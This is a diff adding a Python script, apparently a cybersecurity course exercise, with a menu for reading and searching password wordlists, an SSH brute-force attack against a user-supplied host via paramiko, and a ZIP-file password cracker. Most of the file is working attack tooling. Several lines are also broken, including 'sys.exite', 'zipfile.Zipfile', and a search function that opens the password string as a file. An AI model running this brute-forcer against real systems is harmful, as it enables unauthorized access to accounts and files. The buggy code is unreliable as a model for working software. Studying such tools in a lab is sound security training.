@@ -1,0 +1,209 @@
+#! /usr/bin/env python3
+# Harrison EVans
+# 11/14/21
+# Sources:         
+#  https://www.geeksforgeeks.org/python-how-to-search-for-a-string-in-text-files/
+#  https://github.com/codefellows/seattle-cyber-401d3/blob/main/class-16/challenges/DEMO.md
+# Josh
+# Bill
+
+
+# Libraries
+
+#import os
+#import itertools
+#import getpass
+import zipfile
+import time
+import logging
+import getpass
+import paramiko, sys, os, socket
+from pexpect import pxssh
+from zipfile import ZipFile
+from logging.handlers import RotatingFileHandler
+
+
+logger = logging.getLogger("my_logger")
+
+c_handler = logging.StreamHandler()
+f_handler = logging.FileHandler("test.log")
+c_handler.setLevel(logging.DEBUG)
+f_handler.setLevel(logging.ERROR)
+
+
+c_format = logging.Formatter('%(name)s - %(levelname)s - %(message)s')
+f_format = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+c_handler.setFormatter(c_format)
+f_handler.setFormatter(f_format)
+
+
+logger.addHandler(c_handler)
+logger.addHandler(f_handler)
+
+
+# Functions
+
+logger = logging.getLogger('my_logger')
+
+logger.setLevel(logging.DEBUG)
+handler = RotatingFileHandler('test.log', maxBytes=256, backupCount=3) #set each VALUE
+logger.addHandler(handler)
+
+
+
+
+
+def main():
+    while True:
+        choice=input("""
+        ***Watcha Watcha Want!***
+1 - Iterate Dictionary/Wordlist
+2 - Search Dictionary/Wordlist
+3 - SSH Brute Force Attack
+4 - ZipFile Password Cracker
+5 - Exit Menu
+Please Select Mode:
+""")
+        if choice=="1":
+            iterator()
+        elif choice=="2":
+            inspector()
+        elif choice=="3":
+            ssh()
+            ssh_pass()
+        elif choice=="4":
+            zipcrack()
+            time.sleep(5)
+        elif choice=="5":
+            break
+        else:
+            print("Try Again.")
+
+def iterator():
+    path=input("Enter Path to Wordlist/Dictionary:")
+
+    file=open(path, encoding="ISO-8859-1")
+    line=file.readline() #reads the lines in the file into variable "line"
+    while line:   #reads through the lines of the file and prints them to screen
+        line=line.rstrip()
+        word = line  
+        print(word)
+        time.sleep(1)
+        line=file.readline()
+    file.close()
+
+def inspector():
+    path=input("Enter Path to Wordlist/Dictionary:")
+    passwd=input("Enter Password For Search:")
+
+    file=open(passwd, "r")
+
+    flag=0  # sets starting point for the list
+    index=0
+
+    for line in file:
+        index += 1
+        if passwd in line: # if the password matches the current line, break loop
+            
+            flag=1
+            break
+
+    if flag==0: # if the password was matched above, print confirmation and line number
+        print("Password Was Not Found!","Line", path, index)
+    else: 
+        print("Password Was Found", path, index)
+
+def ssh():
+    global host, user, line, input_file
+    line ="\n-------------------------------------------------------\n"
+    
+    
+    try:
+        host = input(r"Enter IP of Host: ")
+        user = input(r"Enter Username: ")
+        input_file = input(r"Enter File with password list: ")
+
+        if os.path.exists(input_file) == False:
+            print("\nFile Path Does Not Exist.")
+            sys.exit(4)
+    
+
+    except KeyboardInterrupt:
+        print("\n\nUser Requested An Interrupt")
+        sys.exit(4)
+
+def ssh_connect(password, code = 0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+    try:
+        ssh.connect(host, port=22, username=user, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+    except socket.error as e:
+        code = 2
+    ssh.close()
+    return code
+
+def ssh_pass():
+    logger.debug("Doing Somthing!")
+    iteratefile = open(input_file, "r", encoding = "ISO-8859-1")
+
+    print("")
+
+    for i in iteratefile.readlines():
+        password = i.strip("\n")
+        try:
+            response = ssh_connect(password)
+
+            if response == 0:
+                print("%s[*] User: %s [*] Pass Found: %s%s" % (line, user, password, line))
+                logger.info("Password was confirmed: ", password)
+                sys.exite(0)
+            elif response == 1:
+                print("[*] User: %s [*] Pass: %s => Login Incorrect! <=" % (user, password))
+                logger.error("Incorrect Login")
+            elif response == 2:
+                print("[*] Connection Could Not Be Established to Address: %s" % (host))
+        except Exception as e:
+            print(e)
+            pass
+    iteratefile.close()
+            
+
+def crack_password(password_list, obj):
+    idx = 0
+
+    with open(password_list, "rb") as file:
+        for line in file:
+            for word in line.split():
+                try:
+                    idx +=1
+                    obj.extractall(pwd=word)
+                    print("Password found at line", idx)
+                    print("password is", word.decode())
+                    return True
+                except:
+                    continue
+    return False
+
+def zipcrack():
+    password_list = input("Enter Path to Wordlist/Dictionary:")
+
+    zip_file = input("Specify the file you'd like to find the password for: ")
+
+    obj = zipfile.Zipfile(zip_file)
+
+    cnt = len(list(open(password_list, "rb")))
+
+    print("There is a total of", cnt,
+        "number of passwords to test")
+    if crack_password(password_list, obj) == False:
+        print("Password not found in this file") 
+
+
+
+# Main
+main()
+
+# End 
